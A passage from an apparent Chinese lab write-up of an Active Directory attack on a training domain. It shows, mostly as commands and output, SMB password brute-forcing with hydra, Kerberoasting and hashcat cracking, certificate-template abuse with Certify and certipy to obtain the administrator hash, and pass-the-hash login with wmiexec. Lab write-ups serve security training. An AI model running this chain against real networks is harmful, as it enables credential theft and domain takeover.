class="line">3|liying|1|29|13126874319|liying@xiaorang.lab</span><br><span class="line">4|zhaoli|1|44|13075613024|zhaoli@xiaorang.lab</span><br><span class="line">5|zhangyan|0|35|15254139260|zhangyan@xiaorang.lab</span><br><span class="line">6|zhoujing|1|32|15123481906|zhoujing@xiaorang.lab</span><br><span class="line">7|liuying|1|24|13078310649|liuying@xiaorang.lab</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p> personnel.db里面有用户和3个不知道用户名的密码，先将数据处理一下吧，将xr_users和xr_members的内容分别保存到pass和user里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat pass|awk -F&#x27;|&#x27; &#x27;&#123;print($3)&#125;&#x27;&gt;pass.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat pass.txt</span><br><span class="line">admin</span><br><span class="line">i9XDE02pLVf</span><br><span class="line">6N70jt2K9sV</span><br><span class="line">fiAzGwEMgTY</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat user|awk -F&#x27;|&#x27; &#x27;&#123;print($2)&#125;&#x27; &gt;username.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat username.txt</span><br><span class="line">huangmin</span><br><span class="line">zhangrong</span><br><span class="line">liying</span><br><span class="line">zhaoli</span><br><span class="line">zhangyan</span><br><span class="line">zhoujing</span><br><span class="line">liuying</span><br><span class="line">wanghao</span><br><span class="line">wangqiang</span><br><span class="line">wanglu</span><br><span class="line">zhaoyong</span><br><span class="line">zhangli</span><br><span class="line">wangning</span><br><span class="line">wangyu</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>用hydra爆破，可以爆破出来两个用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hydra -L username.txt  -P pass.txt 172.22.9.26 smb</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 13:02:49</span><br><span class="line">[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 1236 login tries (l:309/p:4), ~1236 tries per task</span><br><span class="line">[DATA] attacking smb://172.22.9.26:445/</span><br><span class="line">[445][smb] host: 172.22.9.26   login: zhangjian   password: i9XDE02pLVf</span><br><span class="line">[445][smb] host: 172.22.9.26   login: liupeng   password: fiAzGwEMgTY</span><br></pre></td></tr></table></figure>

<p>然后进行Kerberoast攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation</span><br><span class="line">-------------------------------------  --------  --------  --------------------------  ---------  ----------</span><br><span class="line">TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;</span><br><span class="line">WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;</span><br><span class="line">TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  &lt;never&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$d0a75403c0fd68eb28e523ec82bbcc13$5d435dfada83bc3decd547576a2e0e533633be1ba2ca116bf3944fce42987d3a695c18247303f24a3f5b295919ed0bd0a682c106b81a1e733cf5b27d8816b85b5506c6cd1c04a7eefb3a12f46c00f1483854c51afb647d8fd064e86bc839305531c7a2cd3639f0b79fe070b1c3d10135ee7fc258f1abecec4bcad5d82c3b6a1031235a312c34e669df79ad94ed4a5ddd19f8919e26d5cbe49108176f7a1f52b21a438be962732cd3c7dfbd709b3ee3b7f0ffd4f8817aef4da2ebd5f2339538a6ee44a6e455a0d0ef760238d871f2a01d742aadf0a6dab09e4dac1b37fa317ef49f0bc9ed332df6a15eceabb304cae0d04df2e349ea41f193c8c41c9bbc8876db2cb6edf7ea19dffcbaa75b2e8cc062d873b7697397ae963d8454d867983429b9a24371a2b7b2ded8bb30454fc5c0c92346d0a00f706a04a3fab6a4dd59760f53107727237a316546634868fc926f582409cad4b4ab5674ef0994c60a1256b9677b9069818967813c3cd508a71e6e10fef1ddcbec756bb24cd1ed1d47ba09bed8d199398bf40cb19ecb0298342ca5eb67091f99a66c1cf2b62cb2fea208df89e75245d570e3e6617889d2c3f65be9c64747c21b2cdae4d1f9b06bdd921c46668c433952d0297d575e04e053e33f6251407793efc6e781406a2342a82d4a1939538883c6dff90f8c7845e140332b37efc66cb4d38f7ad7a4d3c66ef6c2d20b56e8de9a5db8db344e18a72a86f7b0447752356e35f6bc97cf328221921735aa58772dc5b800db10ccd461c95783887ad9a065b7b360365b03e5966f9886fd4b5db3472db78c2a7f514f767984e2944a89912e7d4d0bc8c56e7043b9f4bcebe6ea9d1fe4a6715630f1362b2ae5bf62f25c45d3a9fe2ac85e61728c57d1940f21ed763c403d21794e80bace45f553be48d3d367616d735dfc517573d75a418518e90f28c621b3fc614c1e89a7a7a07056a6a849587666ea91dd6b649d7f73356b8c4807f453b0d3209a52f3b99f81012a76dd0ff159d968dd15ad4c7c035792cd1d56f7c537418a3b466b0f6fa2038b159999f2620b20e14f452d3dee9052fac011c78eb3bff235ea41f85aa82e56c8fca3c626a18255f47c40e3e20ddf3c34083f99e9005b61efaa61f939786a024a86e5f56ee1920a452f7f74a66f8ddbfac75eebfd468bc99b2266d2638d7fbf9dae6ba76b36f97cb452eee2bc129553b5c7725b1dc5a6f91a0d67e9cfb3079024ac0c7379a8b1f6eb76223d021233bf75b8279d7d4b01211dbd4b3baaa1c566b945fd757cbe0e8eee3f7ca8df0e2133848109d16df8fddf6b2e62922c9eca4c980cc6949ed145a146b7d1e2ca5fed6c1b378f4963afb15e8c02120467c33f3b30dec45c39da63c7f847513ea72614af712ccb867c6fb31fc135f9690d543a34f6bba84114d71915c021e9a8ade8a50a96c311940bd680e314f4bc8c5a90376b5a313000d497372e4278713368219da610794a1fe1ff560f6c36f4b31e70b63a06c8</span><br><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$756eb4d4a5fe99658d9e4329a03d65a5$7ac1c23cb3d99bb83a38e222924cacfb56f615a4f9b9024b7c8e0879221f744b82ca58662adb97a7a3aa3f7cc6a0095f1b3e8f1cbb2e89433341f2399b12841eba64593a74ce3d6ea849ed9dbb5bda3918470942af00817782299bcb2c44c5b9723aaecf746cf760466f47fdfe5aecf6586e249f0bf305d437747b27e29d2a78d78a897fdb0cfe05a903d35e8e8c31f74091fa6b0886ca297c5ae56b656a67f0dee88e9bcfc8f720f172bfcb8df630ad566a2118f7b862f460fb9a28afee2f3e92069bc8bd3862d0812e3fca7991d851238ca3872cb190d091e3cca90adf4da38d364bc759831d0e61fd2a17864389989b4b1dd49d6ddabc60619d6788947bea7ac1a6040e201e362cbefbff3adb78434a80c66511ef8860493dc94dea833b94bf9b6477a986485e4ee3ab05c91d1ab6ffb8679247bcbfea6c2b51fc15a4ce37ce815e2a7a6185ee09f3bcb05e0c3d31b65d642c3a8cf7546125d03260500675da2efe3c15c234a2bc9f5139a3612d521ad0e8315b3bcde7c3f628c723222c20d19937c8a3497ca4763326686a54c619c2d730e03a6a3247615f4ebde209c7a1e87c1c351fdbf16afb6268755646e14dd2f0ee14a977c4bf1ad0231fc7e4a33ec018e790b5a8d103c9a2ba9f8f0877929c54eda6ffcd936658f2e876273ba5eeef5066ea031c1176bbf365a88e8627f4143173155e5a93920e5722d93054ab1d3596fab388acca607372a94f427a2b7555d6d7e2a0fde397de943b9c34b9d2f9f552dea129a2e1120137ff2a2894e4f19725ad4b282c5be4fe370f428ab9ee0b7bcb30d5ab0a334726edd459ce838630ef6905f6a91640ea3096ca2ebe18691f956c7d017c437aa6219ba880d9948daf8738f30af06b5c6038763dbe9e4b6abf29cdb5ebd742fdf7b334817a29f4a927ce294db573acfb69a7b9b3d4b34e758d0ee3901633c13b15365b3aa50db5cd66ac1a83ed3230dcd3396510eed1554ef6dddd485ae97d4b2385a60833a104672a55b3740a8b57c1f9dfe167fe1e16c6f2c4446c3297ef067441a5a536db4697f979e246cb3abb5aa46a41cc140ccf89b23b503e5975f2cd845e4822a0b1d7b240d6c63e225278745e97c2e32ce7ca1efb2d911c4076911b78fe26adaf5d2289b5e0e76cb0ff50e20e61a8ff76cd0ea14275cb64cb34c219c7a9b4cea7fa0255848fecefa0849a32ffa14f3491e7f83ad092506f123b16df02eb00090e12b2bb5b60291ef8a9d57d6d3fd8505ddf799fa0a56e6309b03f372002090da40e7419e75629c0b518ac4d011b709fcf7866c1a581b7e0a5ac0ae28af906d7b95334c1098eeb3ec94a4e3623b72f60a53182d6f02d60790642400e687954328e1224c473bf010f3c73fd3184269f4cf3d9cb91178a962cb085f3dd45abb794437fbb348904fb12440e7c6ed237d97422ddbde2b0ef6c912a4c4ff86b4153a266f103dd9d69b8806d44e57f0271fa6db4b6b02021a0bdd55ee38323fc9f8d7bbb0a8b</span><br></pre></td></tr></table></figure>

<p>可以拿到两个用户的hash，用hashcat爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hashcat  hash /usr/share/wordlists/rockyou.txt</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat  hash --show</span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2fef93477c96377b81b856c0a918b0f8$7b12ec73692a807cdb959eaeabd253a016b9a6617e9e882016aeba5e5c1f28e4e1d9bb1ce3cfedba110b3c628726b1b50585672544354fae17ec956eff2e27c39494cf3a08d7ab530114273c7d2332866c1483791d6a32b0fea66422abd61412b64b6bd672e30cf844a1da47c8c1cf6791e00abadb34423301ead5ba16fd13631a7a2e29bafaaa9d55a6f9063ef06838953339018d2a077e7c4db47fec5c341c2c53562bf772bd047f5035aade21b9c0c2ad8dc1eec04aa2a1f9e120c6f1508b734895b0ac1cf384ee3b01ffc723b963826221c291f0fbedf92c8f42d549c611b547d1a5bd2cb93c149b8fb01ecc0d785ca8615d49f2d77015c4431d3a122d723936f57e7abb137ce18d22ced5690de6fc3daa6c45f81f97a4427a8c9adb6665eb3ed0010961f38a8860aaaba72a49b67ec435f7ada78ccab514b6c4e465bf0a9b3c14f3e62f580b79d811d2814e3c952dd9a7cacf451632035e1f819a0289913b6f536d317a920b025da509fec7ad356b4d62d892080a87274e2cda87823971f719275afa7b00615cb43e00c586dc09d2f48d909944d352ef0f1b96b74e924c33b4d7a71618c6aaeea94c7b1b61fdc3cbda2b3a0074942a982e7c63258b58ffc74ca532760ad3da4d1b3f5275330457877de4d840477b03c1dbef4ab68bfbfc0400bb63082c9fdc3ca13cc89a8b91846e06d69a8d713aa7e184cc7ed888df935d42580969a9bb00fd61887bd7c55eca669e14ef8705fcb9d5515218c991935c5b37973b363ba58453543a7033e1869d6e1f4304c1887274b04bbe3bea1a24556698ba5fb21218100cfbd73fc5d09e424786f6e64b39e36c7d86b751c502d9f101a368e575c0be0fe4660db85b5d8c13af3c06c870bf3db18e9e7056256d29b153fc6724f6778c8502b763178a34d1fcd67c172d9a943f0a55b972b0d68f0d9507cfbd8acac33d5b340c6db1728a6ff79537e91c9fde40764b79448cf5f122080d770a860baf50a76a08076ac52de4d671cc8bd84f79bda7c0a52988b62a2954f7fe274ab0ad008cdbf8c3710d7d9cd263d9479c3309de5fec18ce56758e056dcfd942500adea9a14da3555e29e9277f8ca07af73299f70472137f7cd045b60f639f14b3bcfcf635c4ec0c0359c4d7238121af36fa7fb29316d4a45890c0973e432fb2b617256cfeec85c8496c506e79c31e4507eaf5ecc7d67540eed5fec810cdcf6d1682156597450c27b27ad617fdf0fd03abe04d181e58cec2af1edc85e243102c8db404aaaca939c42a54d633585eb7e26348ff26951c5cc8c6271d227520fdea38033174b4efddf6a589688223b263e8808fdbc85bbe20ea471fb529216d802776dcc3a7ef68334059213d49640da993c067719c0b119f9c3914295dedefcbd89f0facf3ba3700227de362e49f88302bf87e4cfc5787b364951e3301efa5ff817f5dbf372536ec3aa4:@Passw0rd@</span><br></pre></td></tr></table></figure>

<p>然后用<code>chenchen@xiaorang.lab:@Passw0rd@</code>进行远程桌面登录,用bloodhound进行信息搜集（其实也不用，因为之前fscan已经扫到洞了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# bloodhound-python -u chenchen -p @Passw0rd@ -d xiaorang.lab  -c all --dns-tcp -ns 172.22.9.7 --auth-method ntlm --zip</span><br><span class="line">INFO: Found AD domain: xiaorang.lab</span><br><span class="line">INFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 2 computers</span><br><span class="line">INFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab</span><br><span class="line">INFO: Found 95 users</span><br><span class="line">INFO: Found 52 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.lab</span><br><span class="line">INFO: Querying computer: XIAORANG-DC.xiaorang.lab</span><br><span class="line">INFO: Done in 00M 06S</span><br><span class="line">INFO: Compressing output into 20250416132802_bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传Certify.exe查找易受攻击的证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\chenchen\Desktop\新建文件夹&gt;Certify.exe find /vulnerable</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ &#x27;__| __| |  _| | | |</span><br><span class="line"> | |___|  __/ |  | |_| | | | |_| |</span><br><span class="line">  \_____\___|_|   \__|_|_|  \__, |</span><br><span class="line">                             __/ |</span><br><span class="line">                            |___./</span><br><span class="line">  v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Action: Find certificate templates</span><br><span class="line">[*] Using the search base &#x27;CN=Configuration,DC=xiaorang,DC=lab&#x27;</span><br><span class="line"></span><br><span class="line">[*] Listing info about the Enterprise CA &#x27;xiaorang-XIAORANG-DC-CA&#x27;</span><br><span class="line"></span><br><span class="line">    Enterprise CA Name            : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Hostname                  : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    FullName                      : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class="line">    Cert SubjectName              : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Cert Thumbprint               : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E</span><br><span class="line">    Cert Serial                   : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Cert Start Date               : 2023/7/14 12:33:21</span><br><span class="line">    Cert End Date                 : 2028/7/14 12:43:21</span><br><span class="line">    Cert Chain                    : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab</span><br><span class="line">    UserSpecifiedSAN              : Disabled</span><br><span class="line">    CA Permissions                :</span><br><span class="line">      Owner: BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line"></span><br><span class="line">      Access Rights                                     Principal</span><br><span class="line"></span><br><span class="line">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">    Enrollment Agent Restrictions : None</span><br><span class="line"></span><br><span class="line">[!] Vulnerable Certificates Templates :</span><br><span class="line"></span><br><span class="line">    CA Name                               : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Template Name                         : XR Manager</span><br><span class="line">    Schema Version                        : 2</span><br><span class="line">    Validity Period                       : 1 year</span><br><span class="line">    Renewal Period                        : 6 weeks</span><br><span class="line">    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line">    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS</span><br><span class="line">    Authorized Signatures Required        : 0</span><br><span class="line">    pkiextendedkeyusage                   : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class="line">    mspki-certificate-application-policy  : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights           : NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Domain Users         S-1-5-21-990187620-235975882-534697781-513</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                       : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">        WriteOwner Principals       : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">        WriteDacl Principals        : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">        WriteProperty Principals    : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Certify completed in 00:00:10.1629693</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CA Name                               : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">Template Name                         : XR Manage</span><br></pre></td></tr></table></figure>

<p>这个可以打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -t</span><br><span class="line">emplate &#x27;XR Manager&#x27;  -upn administrator@xiaorang.lab</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 7</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@xiaorang.lab&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@xiaorang.lab&#x27;: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</span><br></pre></td></tr></table></figure>

<p>得到了administrator的哈希了，拿下域控了，直接登录这台主机和域控拿flag即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-wmiexec  --hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.26</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/" class="post-title-link" itemprop="url">春秋云镜-Brute4Road</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-15 14:35:35" itemprop="dateCreated datePublished" datetime="2025-04-15T14:35:35+08:00">2025-04-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-04-17 13:20:17" itemprop="dateModified" datetime="2025-04-17T13:20:17+08:00">2025-04-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>10 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
